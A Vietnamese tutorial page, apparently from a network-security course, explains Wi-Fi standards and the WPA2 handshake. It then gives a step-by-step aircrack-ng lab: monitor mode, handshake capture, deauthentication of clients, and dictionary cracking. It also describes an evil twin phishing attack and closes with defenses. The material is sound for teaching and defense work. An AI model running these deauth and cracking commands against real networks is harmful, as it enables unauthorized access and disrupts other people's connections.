# 📡 Wireless Security: Wi-Fi Hacking & Defense

> [← Back to Network Security](./README.md)

"Sóng Wi-Fi không có mắt. Nó bay xuyên tường nhà bạn ra ngoài đường."
Nếu Wi-Fi không an toàn, hacker ngồi quán cà phê đối diện có thể đánh cắp toàn bộ dữ liệu của bạn.

---

## 1. Các chuẩn bảo mật Wi-Fi

| Chuẩn | Ra đời | Tình trạng | Mô tả |
| :--- | :--- | :--- | :--- |
| **WEP** | 1997 | **ĐÃ CHẾT** | Cực kỳ yếu. Có thể hack trong 5 phút. Tuyệt đối không dùng. |
| **WPA** | 2003 | **ĐÃ CHẾT** | Bản vá tạm thời cho WEP. Cũng đã bị crack. |
| **WPA2** | 2004 | **PHỔ BIẾN** | Dùng thuật toán mã hóa AES. An toàn nếu mật khẩu mạnh. |
| **WPA3** | 2018 | **MỚI NHẤT** | Chống Brute-force offline (SAE handshake). Rất khó hack. |

---

## 2. Cơ chế WPA2 Handshake (Bắt tay 4 bước)

WPA2 không gửi mật khẩu qua sóng. Nó gửi một "Handshake" (Bắt tay) để xác thực.
Hacker không cần kết nối vào Wi-Fi cũng có thể bắt được gói tin này.

1.  **Client:** "Tôi muốn kết nối."
2.  **Router:** "OK, đây là mã thử thách (Nonce)."
3.  **Client:** "Tôi đã giải mã thử thách bằng mật khẩu của tôi." (Gửi kèm MIC).
4.  **Router:** "Chính xác! Kết nối thành công."

> **Điểm yếu:** Hacker bắt được gói tin số 2 & 3 -> Mang về nhà dùng máy mạnh để dò (Brute-force) mật khẩu offline.

---

## 3. Lab Thực hành: Hack WPA2 (Aircrack-ng)

### **A. Yêu cầu phần cứng**
Bạn cần một **USB Wi-Fi Adapter** hỗ trợ 2 chế độ:
1.  **Monitor Mode:** Nghe lén tất cả gói tin trên không trung (không chỉ gói tin gửi cho mình).
2.  **Packet Injection:** Có khả năng bắn gói tin giả mạo (để đá người dùng ra khỏi mạng).

*   *Gợi ý:* Alfa AWUS036NHA (Chipset Atheros AR9271) hoặc TP-Link WN722N (v1 only).

### **B. Quy trình tấn công**

#### **Bước 1: Bật Monitor Mode**
Biến card mạng thành "tai thính".
```bash
airmon-ng start wlan0
```
-> Tên card mạng đổi thành `wlan0mon`.

#### **Bước 2: Quét mạng (Scan)**
Tìm mục tiêu (BSSID - MAC Address của Router và Channel).
```bash
airodump-ng wlan0mon
```

#### **Bước 3: Nghe lén mục tiêu (Capture Handshake)**
Chỉ tập trung nghe 1 Router mục tiêu để bắt Handshake.
```bash
airodump-ng -c 6 --bssid 11:22:33:44:55:66 -w capture wlan0mon
```
*   `-c 6`: Channel 6.
*   `-w capture`: Lưu kết quả vào file `capture`.

#### **Bước 4: Deauth Attack (Đá người dùng)**
Nếu không ai kết nối, sẽ không có Handshake.
Hacker gửi gói tin "Deauthentication" giả mạo Router để đá Client ra -> Client tự động kết nối lại -> BẮT ĐƯỢC HANDSHAKE!
```bash
aireplay-ng -0 10 -a 11:22:33:44:55:66 -c AA:BB:CC:DD:EE:FF wlan0mon
```
*   `-0 10`: Gửi 10 gói tin Deauth.
*   `-c`: MAC của Client nạn nhân.

#### **Bước 5: Crack Mật khẩu (Offline)**
Khi `airodump-ng` báo "WPA Handshake: ...", bạn đã thành công bước 1.
Giờ dùng từ điển (Wordlist) để dò pass.
```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```
-> Nếu mật khẩu nằm trong file `rockyou.txt`, nó sẽ hiện ra!

---

## 4. Evil Twin Attack (Sinh đôi quỷ dữ)

Đây là kỹ thuật Social Engineering kết hợp kỹ thuật.
1.  Hacker tạo một điểm phát Wi-Fi giả mạo có tên y hệt Wi-Fi thật (VD: "Coffee_Highlands").
2.  Dùng Deauth Attack làm sập Wi-Fi thật.
3.  Nạn nhân bị mất mạng -> Thấy Wi-Fi "Coffee_Highlands" (giả) sóng mạnh hơn -> Kết nối vào.
4.  Wi-Fi giả hiện trang đăng nhập giả mạo: "Vui lòng nhập lại mật khẩu Wi-Fi để cập nhật Firmware".
5.  Nạn nhân nhập pass -> Hacker có pass!

---

## 5. Phòng thủ (Defense)

1.  **Mật khẩu mạnh:** Đặt mật khẩu dài, ngẫu nhiên. (Aircrack-ng sẽ bó tay nếu pass là `X9#mK@2!bPq`).
2.  **Dùng WPA3:** Nếu Router hỗ trợ.
3.  **Tắt WPS (Wi-Fi Protected Setup):** WPS có lỗ hổng cực lớn cho phép dò PIN trong vài giờ.
4.  **Ẩn SSID (Không khuyến khích):** Thực ra không có tác dụng bảo mật mấy, chỉ làm phiền người dùng.
